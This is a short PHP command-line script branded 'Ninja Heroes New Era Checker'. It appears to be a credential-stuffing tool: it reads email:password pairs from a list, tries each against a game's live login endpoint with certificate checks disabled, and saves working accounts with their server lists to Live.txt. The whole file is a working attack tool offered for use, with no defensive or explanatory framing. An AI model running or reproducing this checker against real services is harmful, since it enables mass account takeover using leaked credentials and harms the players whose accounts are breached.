<?php
echo "
 _____  _            ___  _         
|  __ \(_)          / _ \| |        
| |__) |_  ___ _ __| | | | |_ ____  
|  _  /| |/ __| '__| | | | __|_  /  
| | \ \| | (__| |  | |_| | |_ / / _ 
|_|  \_\_|\___|_|   \___/ \__/___(_) 
Ninja Heroes New Era Checker\n\n";
error_reporting(0);
echo "Input List : ";
$list = trim(fgets(STDIN));

$empas = preg_split(
    '/\n|\r\n?/',
    trim(file_get_contents($list))
);
$numbers = 1;
for ($i = 0; $i < count($empas); $i++) {
    $parse = explode(":", $empas[$i]);
    $email = $parse[0];
    $pass = $parse[1];
    $url = "http://central.kageherostudio.com/game/lyto/login?accId=" . $email . "&pwd=" . $pass . "&channel=99108&lv=1";

    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    $headers = array(
        "Accept: application/json",
    );
    curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $resp = curl_exec($curl);
    $json_data = json_decode($resp);

    if ($json_data->code == '1') {
    $data = json_decode($resp, true);
    $msg = json_decode($data['msg'], true);
    
    $accId = $msg['accId'];
    $servers = $msg['servers'];
    $modified_servers = array_map(function ($server) {
        return $server + 1;
    }, $servers);
    $servers_str = implode(',', $modified_servers);
    
    $Live = "[".$numbers++."] Live - $email|$pass [Server: $servers_str ]\n";
    echo $Live;
    file_put_contents("Live.txt", $Live . PHP_EOL, FILE_APPEND);
    } else{
        echo "[".$numbers++."] Die - $email|$pass \n";
    } 

    curl_close($curl);
}
